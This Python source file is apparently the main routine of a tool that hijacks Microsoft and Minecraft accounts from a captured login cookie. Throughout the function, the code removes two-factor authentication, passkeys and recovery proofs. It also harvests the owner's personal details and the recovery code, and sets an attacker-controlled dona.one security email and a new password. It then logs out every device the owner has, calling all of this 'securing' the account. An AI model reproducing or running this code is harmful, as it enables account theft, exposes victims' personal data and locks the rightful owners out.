from views.utils.securing.securityInformation import securityInformation
from views.utils.securing.recoveryCodeSecure import recoveryCodeSecure
from views.utils.securing.changePrimaryAlias import changePrimaryAlias
from views.utils.securing.getRecoveryCode import getRecoveryCode
from views.utils.securing.getAccountInfo import getAccountInfo
from views.utils.securing.removeServices import removeServices
from views.utils.securing.generateEmail import generateEmail
from views.utils.securing.removeProof import removeProof
from views.utils.securing.removeZyger import removeZyger
from views.utils.securing.generatePWD import generatePWD
from views.utils.securing.getCookies import getCookies
from views.utils.securing.polishHost import polishHost
from views.utils.securing.getProfile import getProfile
from views.utils.securing.remove2FA import remove2FA
from views.utils.securing.logoutAll import logoutAll
from views.utils.securing.getAMRP import getAMRP
from views.utils.securing.getSSID import getSSID
from views.utils.securing.getXBL import getXBL
from views.utils.securing.getT import getT

from views.utils.minecraft.getMethod import getMethod
from views.utils.minecraft.getCapes import getCapes

import uuid
import json

def secure(msaauth: str):

    config = json.load(open("config.json", "r+"))
    email_key = config["tokens"]["donarev_token"]

    accountInfo = {
        "oldName": "Failed to Get",
        "newName": "Couldn't Change!",
        "email": "Couldn't Change!",
        "oldEmail": "Couldn't Change",
        "secEmail": "Couldn't Change!",
        "password": "Couldn't Change!",
        "recoveryCode": "Couldn't Change!",
        "loginCookie": msaauth,
        "status": "Unknown",
        "timeTaken": 0,
        "SSID": False,
        "firstName": "Failed to Get",
        "lastName": "Failed to Get",
        "fullName": "Failed to Get",
        "region": "Failed to Get",
        "birthday": "Failed to Get",
        "method": "Not purchased",
        "capes": "No capes"
    }
    
    canary, apicanary, amsc = getCookies() 
    print("[+] - Got Cookies! Polishing login cookie...")
    host = polishHost(msaauth, amsc)
    if host == "Locked":
        accountInfo["email"] = "Locked"
        accountInfo["secEmail"] = "Locked"
        accountInfo["recoveryCode"] = "Locked"
        accountInfo["password"] = "Locked"
        accountInfo["status"] = "Locked"

        return accountInfo

    if host == "Down":
        accountInfo["email"] = "Microsoft Down"
        accountInfo["secEmail"] = "Microsoft Down"
        accountInfo["recoveryCode"] = "Microsoft Down"
        accountInfo["password"] = "Microsoft Down"
        accountInfo["status"] = "Microsoft Down"

        return accountInfo
    
    # Minecraft checking
    print("[~] - Checking Minecraft Account")
    XBLResponse = getXBL(host)

    if XBLResponse:
        print("[+] - Got XBL (Has Xbox Profile)")

        # XBL && Token
        xbl = XBLResponse["xbl"]

        ssid = getSSID(xbl)
        
        # Get capes, profile and purchase method
        if ssid:
            print("[+] - Got SSID! (Has Minecraft)")
            accountInfo["SSID"] = ssid

            capes = getCapes(ssid)
            if capes:
                print(f"Capes -> {capes}")
                accountInfo["capes"] = ", ".join(i["alias"] for i in capes)
                print(f"[+] - Got capes")
            else:
                accountInfo["capes"] = "No Capes"

            # Gets account name
            profile = getProfile(ssid)
            if not profile:
                print("[x] - Failed to get profile (No Minecraft Java)")
            else:
                print(f"[+] - Got profile (Has Minecraft Java)")
                accountInfo["oldName"] = profile

            method = getMethod(ssid)
            if method:
                accountInfo["method"] = method
                print(f"[+] - Got purchase method")
        else:
            print("[x] - Failed to get SSID")

    else:
        print("[x] - Failed to get XBL (Account has no Xbox Profile)")
        accountInfo["oldName"] = "No Minecraft"

    T = getT(msaauth, amsc)

    if not T:

        print("[X] - Failed to get T")
        # This general has 2 reasons
        # 1. Microsoft really is down
        # 2. Microsoft is not allowing any logins in this acc 
        # .eg if you try to login manually itl redirect you to an error page

        accountInfo["email"] = "Microsoft Down"
        accountInfo["secEmail"] = "Microsoft Down"
        accountInfo["recoveryCode"] = "Microsoft Down"
        accountInfo["password"] = "Microsoft Down"
        accountInfo["status"] = "Microsoft Down"

        return accountInfo

    # Security Steps

    if T:
        print("[+] - Found T")
        amrp = getAMRP(T, amsc)

        if amrp:
            
            print("[+] - Got AMRP")

            # 2FA
            remove2FA(amrp, apicanary, amsc)

            # Pass Keys
            removeZyger(amrp, apicanary, amsc)

            # Removes secEmails
            removeProof(amrp, apicanary, amsc)
            print("[+] - Removed all Proofs")
                                          
            removeServices(amrp, amsc)          

            accountMSInfo = getAccountInfo()

            accountInfo["firstName"] = accountMSInfo["firstName"]
            accountInfo["lastName"] = accountMSInfo["lastName"]
            accountInfo["fullName"] = accountMSInfo["fullName"]
            accountInfo["region"] = accountMSInfo["region"]
            accountInfo["birthday"] = accountMSInfo["birthday"]
            print("[+] - Got Account Information")

            securityParameters = json.loads(securityInformation(amrp))
            print("[+] - Got Security Parameters")

            if securityParameters:

                sEmail = securityParameters["email"]
                encryptedNetID = securityParameters["WLXAccount"]["manageProofs"]["encryptedNetId"] 
                
                recoveryCode = getRecoveryCode(
                    amrp,
                    apicanary,
                    amsc,
                    encryptedNetID
                )
                print("[+] - Got Recovery Code")


                secEmail = str(uuid.uuid4())

                generateEmail(secEmail, "dona.one", email_key)
                
                print(f"[+] - Generated Security Email ({secEmail}@dona.one)")
                
                new_password = generatePWD()
                print(f"[+] - Generated Password ({new_password})")

                print("[~] - Automaticly Securing Account...")
                newData = recoveryCodeSecure(sEmail, recoveryCode, f"{secEmail}@dona.one", new_password, email_key) 

                if newData:
                    
                    accountInfo["secEmail"] = f"{secEmail}@dona.one"
                    accountInfo["recoveryCode"] = newData[0]
                    accountInfo["password"] = newData[1]
                
                if config["autosecure"]["replace_main_alias"]:

                    primaryEmail = str(uuid.uuid4())
                    print(f"[+] - Generated Primary Email ({primaryEmail}@dona.one)")

                    changePrimaryAlias(primaryEmail, amrp, apicanary, amsc)
                    print(f"[+] - Changed Primary Alias)")

                    accountInfo["email"] = f"{primaryEmail}@outlook.com"
                    accountInfo["oldEmail"] = sEmail
                
                else:
                    
                    accountInfo["oldEmail"] = sEmail
                    accountInfo["email"] = sEmail
                
            # Logout all devices
            logoutAll(amrp, apicanary, amsc)

            print("[+] - Account has been secured")

    return accountInfo


            

    

    
        

        